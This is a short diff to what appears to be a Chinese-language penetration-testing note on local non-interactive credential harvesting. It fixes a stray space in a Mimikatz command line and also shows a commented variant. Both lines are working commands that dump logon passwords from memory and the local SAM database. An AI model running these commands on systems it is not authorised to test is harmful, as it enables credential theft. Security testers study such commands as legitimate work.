@@ -28,7 +28,7 @@ https://github.com/gentilkiwi/mimikatz/releases
 本地非交互式凭证获取:
 
 ```ts
-mimikatz.exe "log logon.txt" "privilege::debug" "sekurlsa::logonpasswords" " exit"
+mimikatz.exe "log logon.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
 // mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 ```
 
